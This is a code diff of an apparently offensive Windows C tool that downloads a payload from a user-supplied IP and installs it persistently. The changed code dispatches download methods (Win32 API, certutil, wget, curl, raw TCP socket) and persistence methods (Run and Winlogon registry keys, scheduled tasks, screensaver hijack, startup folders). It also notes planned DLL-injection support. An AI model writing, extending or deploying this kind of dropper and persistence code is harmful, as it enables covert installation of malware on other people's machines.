@@ -13,13 +13,33 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 VOID _ListOpts(const char *str, ...);
 #define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)
 
-typedef struct _WRITABLE_DIR {
-    char path[MAX_PATH + 1];
-} WRITABLE_DIR, *PWRITABLE_DIR;
+typedef BOOL (*DownloadFunc)(PDOWNLOAD_CONTEXT);
+typedef BOOL (*PersFunc)(PPERS_CONTEXT);
+
+const DownloadFunc downloadTechniques_[] = {
+    DownloadUsingWin32,
+    DownloadUsingCertutil,
+    DownloadUsingWget,
+    DownloadUsingCurl,
+    DownloadUsingTCPSocket
+};
+
+const PersFunc persTechniques_[] = {
+    InjectRunRegistry,
+    InjectWinlogonRegistry,
+    CreateScheduledTask,
+    HijackScreensaver,
+    AddToCUStartupFolder,
+    AddToAUStartupFolder
+};
+
+#define NUM_DTS (sizeof(downloadTechniques_) / sizeof(downloadTechniques_[0]))
+#define NUM_PTS (sizeof(persTechniques_) / sizeof(persTechniques_[0]))
 
 VOID _ListOpts(const char *str, ...) {
     int o=0;
@@ -40,6 +60,12 @@ VOID _ListOpts(const char *str, ...) {
     va_end(arg);
 }
 
+/* ToDO For DLL Injection */
+/*
+typedef struct _WRITABLE_DIR {
+    char path[MAX_PATH + 1];
+} WRITABLE_DIR, *PWRITABLE_DIR;
+
 BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
     if (*count >= *capacity) {
         *capacity = (*capacity == 0) ? 16 : (*capacity * 2);
@@ -56,6 +82,7 @@ BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char 
 
     return TRUE;
 }
+*/
 
 BOOL FileExists(const char *path) {
 	DWORD attrib = GetFileAttributesA(path);
@@ -136,35 +163,15 @@ int HandleDownload(char* opt, void *data) {
 
     PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
     
-    switch ((char) *opt) {
-        case '0':
-           break; 
-        case '1':
-            if (!DownloadUsingWin32(pDownloadContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '2':
-            if (!DownloadUsingCertutil(pDownloadContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '3':
-            if (!DownloadUsingWget(pDownloadContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '4':
-            if (!DownloadUsingCurl(pDownloadContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '5':
-            break;
-        default:
-            printf("[?] Unknown option specified. Select <h> for available options\n");
-            return CONTINUE_ERROR;
+    int optIndex = (char)*opt - '1';
+    if (optIndex < 0 || optIndex >= NUM_DTS) {
+        printf("[?] Unknown option specified. Select <h> for available options\n");
+        return CONTINUE_ERROR;
     }
+    if (!downloadTechniques_[optIndex](pDownloadContext)) {
+        return CONTINUE_ERROR;
+    }
+    return SUCCESS;
 }
 
 int HandlePersistence(char *opt, void *data) {
@@ -172,67 +179,24 @@ int HandlePersistence(char *opt, void *data) {
         ListOpts(
             "Registry run key",
             "Registry winlogon key",
-            "Create a startup service",
             "Create a scheduled task",
             "Hijack screensaver",
-            "Add the payload to the current user's startup folder"
+            "Add the payload to the current user's startup folder",
+            "Add the payload to the all-users's startup folder"
         );
         printHelp = FALSE;
         return CONTINUE_ERROR;
     }
 
     PPERS_CONTEXT pPersContext = (PPERS_CONTEXT) data;
-
-    switch((char) *opt) {
-        case '1':
-            if (!InjectRunRegistry(pPersContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '2':
-            if (!InjectWinlogonRegistry(pPersContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        case '5':
-            if (!HijackScreensaver(pPersContext)) {
-                return CONTINUE_ERROR;
-            }
-            return SUCCESS;
-        default:
-            printf("[?] Unknown option specified. Select <h> for available options\n");
-            return CONTINUE_ERROR;
+    int optIndex = (char)*opt - '1';
+    if (optIndex < 0 || optIndex >= NUM_PTS) {
+        printf("[?] Unknown option specified. Select <h> for available options\n");
+        return CONTINUE_ERROR;
     }
-}
-
-int HasWriteAccess(char *dirPath, void *data) {
-    (void) data;
-
-    char testPath[MAX_PATH + 1];
-    if (dirPath[strlen(dirPath) - 1] != '\\') {
-        dirPath[strlen(dirPath)] = '\\';
+    if (!persTechniques_[optIndex](pPersContext)) {
+        return CONTINUE_ERROR;
     }
-    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
-    
-    wchar_t wTestPath[MAX_PATH + 1];
-    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);
-
-
-    HANDLE hFile = CreateFileW(
-        wTestPath,
-        FILE_WRITE_DATA,
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
-        NULL
-    );
-
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return WIN_ERROR;
-    }
-
-    CloseHandle(hFile);
     return SUCCESS;
 }
  
@@ -240,7 +204,7 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
 	int opt;
 	int iFlag = 0, eFlag = 0, tFlag = 0;
 	*port = 80;
-	while ((opt = getopt(argc, argv, "i:e:t:p:sP")) != -1) {
+	while ((opt = getopt(argc, argv, "i:e:t:p:sPh")) != -1) {
 		switch (opt) {
 			case 'i':
 				*ipLen = strlen(optarg);
@@ -281,6 +245,8 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
             case 'P':
                 *onlyPersistence = TRUE;
                 break;
+            case 'h':
+                return FALSE;
 			default:
 				return FALSE;
 				break;
@@ -326,8 +292,8 @@ printf("     .    .     .            +         .         .                 .  .\
 
 
 
-    if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket, &onlyPersistence) == FALSE) {
-        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
+    if (!ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket, &onlyPersistence)) {
+        PrintHelp();
 		exit(1);
 	}
 
